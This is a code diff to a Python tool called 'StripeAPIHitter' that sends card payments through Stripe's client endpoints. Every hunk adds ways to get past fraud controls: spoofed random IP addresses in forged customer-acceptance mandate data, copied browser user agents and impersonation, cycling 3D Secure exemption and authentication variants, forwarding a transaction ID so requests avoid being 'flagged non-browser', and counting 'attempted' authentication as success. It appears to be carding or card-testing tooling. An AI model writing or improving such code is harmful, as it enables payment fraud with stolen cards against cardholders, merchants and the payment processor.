@@ -1432,13 +1432,17 @@ class StripeAPIHitter:
                             "payment_method_options[card][request_three_d_secure]": "automatic",
                             "payment_method_options[card][setup_future_usage]": "off_session",
                         },
-                        # Attempt 2: MIT Exemption with random Network Transaction ID
+                        # Attempt 2: Mandate Data Customer Acceptance with spoofed IP & Setup Future Usage
+                        # (MIT exemption requires sk_live — useless on client pk_live endpoints)
                         {
-                            "payment_method_options[card][mit_exemption][reason]": "low_value",
-                            "payment_method_options[card][mit_exemption][network_transaction_id]": f"nt_{int(time.time())}{random.randint(1000,9999)}",
+                            "payment_method_options[card][setup_future_usage]": "off_session",
+                            "mandate_data[customer_acceptance][type]": "online",
+                            "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+                            "mandate_data[customer_acceptance][online][user_agent]": profile["user_agent"],
                         },
-                        # Attempt 3: Mandate Data Customer Acceptance with spoofed IP & Setup Future Usage
+                        # Attempt 3: Low-value TRA exemption flag (works on Radar-enabled merchants)
                         {
+                            "payment_method_options[card][request_three_d_secure]": "automatic",
                             "payment_method_options[card][setup_future_usage]": "off_session",
                             "mandate_data[customer_acceptance][type]": "online",
                             "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
@@ -1661,7 +1665,7 @@ class StripeAPIHitter:
                                             reconfirm_data = {
                                                 "payment_method": pm_id,
                                                 "expected_payment_method_type": "card",
-                                                "payment_method_options[card][request_three_d_secure]": "any",
+                                                "payment_method_options[card][request_three_d_secure]": "automatic",
                                                 "consent[terms_of_service]": "accepted",
                                                 "key": self.pk_live,
                                             }
@@ -1732,6 +1736,15 @@ class StripeAPIHitter:
                                     if self.stripe_account:
                                         auth_headers["Stripe-Account"] = self.stripe_account
                                     
+                                    # Extract threeDSServerTransID from the source object if available
+                                    # Real Stripe.js always forwards this from the 3DS2 source — missing it flags non-browser
+                                    _tds_server_trans_id = None
+                                    _source_obj = sdk.get("three_d_secure_2_source_object") or {}
+                                    if isinstance(_source_obj, dict):
+                                        _tds_server_trans_id = _source_obj.get("three_d_secure_2", {}).get("three_d_secure_server_transaction_id")
+                                    if not _tds_server_trans_id:
+                                        _tds_server_trans_id = sdk.get("server_transaction_id") or sdk.get("three_ds_server_trans_id")
+                                    
                                     auth_variations = [
                                         {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "02", "fingerprintAttempted": True},
                                         {"threeDSCompInd": "U", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
@@ -1767,6 +1780,9 @@ class StripeAPIHitter:
                                             "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                             "key": pk
                                         }
+                                        # Forward threeDSServerTransID if extracted — session continuity signal
+                                        if _tds_server_trans_id:
+                                            auth_data["three_ds_server_trans_id"] = _tds_server_trans_id
                                         try:
                                             auth_resp_raw = await loop.run_in_executor(None, lambda data=auth_data: cffi_requests.post(
                                                 auth_url, headers=auth_headers, data=data,
@@ -1775,9 +1791,16 @@ class StripeAPIHitter:
                                             state = auth_json.get("state")
                                             if state in ["succeeded", "authenticated"]:
                                                 break
+                                            
+                                            # Parse transStatus from ARes — 'A' (attempted) counts as frictionless success
+                                            ares = auth_json.get("ares", {}) or {}
+                                            trans_status = ares.get("transStatus")
+                                            if trans_status in ["Y", "A"]:
+                                                # Y = fully authenticated, A = attempted (issuer ACS unreachable but attempt proven)
+                                                state = "authenticated"
+                                                break
                                                 
                                             # Handle ACS Challenge verification
-                                            ares = auth_json.get("ares", {}) or {}
                                             acs_url = ares.get("acsURL") or auth_json.get("acs_url")
                                             creq = ares.get("cReq") or auth_json.get("creq")
                                             
@@ -1805,6 +1828,10 @@ class StripeAPIHitter:
                                                             comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                                 except Exception:
                                                     pass
+                                            
+                                            # transStatus N/R = hard denied by issuer, stop looping
+                                            if trans_status in ["N", "R"]:
+                                                break
                                                 
                                             if state in ["succeeded", "authenticated", "challenge_required"]:
                                                 break
